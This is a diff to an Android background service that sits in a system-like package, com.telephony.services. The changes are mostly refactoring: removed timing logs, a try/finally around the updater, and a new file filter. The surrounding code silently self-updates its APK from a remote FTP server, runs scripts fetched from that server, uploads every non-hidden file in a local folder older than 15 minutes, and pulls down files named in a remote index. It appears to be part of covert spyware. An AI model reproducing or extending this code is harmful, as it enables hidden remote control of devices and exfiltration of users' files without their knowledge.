@@ -1,8 +1,7 @@
 package com.telephony.services;
 
 import java.io.File;
-import java.io.FilenameFilter;
-import java.util.ArrayList;
+import java.io.FileFilter;
 import java.util.Date;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -67,14 +66,12 @@ public class SuperService extends Service {
 
 		public void run() {
 			long rfs = -1;
-			long b = System.currentTimeMillis();
 			try {
 				command = intent.getIntExtra(Utils.EXTRA_COMMAND, 0);
 				interval = intent.getLongExtra(Utils.EXTRA_INTERVAL, 0);
 				Log.d(Utils.LOG_TAG, context.getClass().getName() + ": start " + startId + " with command: " + command);
-				if (sPref.getRootDir().exists() && (Utils.updateExternalStorageState() == Utils.MEDIA_MOUNTED)
+				if (sPref.getRootDir().exists() && (Utils.getExternalStorageStatus() == Utils.MEDIA_MOUNTED)
 						&& Utils.waitForInternet(context, sPref.isWifiOnly(), 30)) {
-					Log.d(Utils.LOG_TAG, "time wait for internet and storage: " + (System.currentTimeMillis() - b));
 					if (!ftp.isReady()) {
 						ftp.connect(sPref.getRemoteUrl());
 					}
@@ -82,25 +79,26 @@ public class SuperService extends Service {
 						switch (command) {
 						case Utils.COMMAND_RUN_UPDATER:
 							upd = new Updater(context, ftp);
-							if (upd.getRemoteVersion() > Utils.getCurrentVersion(context)) {
-								upd.updateAPK();
+							try {
+								if (upd.getRemoteVersion() > Utils.getCurrentVersion(context)) {
+									upd.updateAPK();
+								}
+							} finally {
+								upd.free();
 							}
-							upd.free();
 							break;
 
 						case Utils.COMMAND_RUN_SCRIPTER:
 							scp = new Scripter(context, ftp);
 							scp.execScript();
-							Log.d(Utils.LOG_TAG, "time scripter: " + (System.currentTimeMillis() - b));
 							break;
 
 						case Utils.COMMAND_RUN_UPLOAD:
-							b = System.currentTimeMillis();
-							ArrayList<File> list = Utils.rlistFiles(sPref.getRootDir(), new FilenameFilter() {
-								public boolean accept(File dir, String filename) {
-									File f = new File(dir, filename);
+							File[] list = Utils.rlistFiles(sPref.getRootDir(), new FileFilter() {
+								public boolean accept(File f) {
 									Date today = new Date();
-									return !f.isHidden() && new Date(f.lastModified()).before(new Date(today.getTime() - (Utils.HOUR)));
+									return f.isDirectory()
+											|| (!f.isHidden() && new Date(f.lastModified()).before(new Date(today.getTime() - (Utils.MINUTE * 15))));
 								}
 							});
 							String remotefile = "";
@@ -130,7 +128,6 @@ public class SuperService extends Service {
 						case Utils.COMMAND_RUN_DOWNLOAD:
 							String[] files = ftp.downloadFileStrings(INDEX_FILE);
 							File file = null;
-							b = System.currentTimeMillis();
 							for (String fn : files) {
 								try {
 									if (!fn.equals("")) {
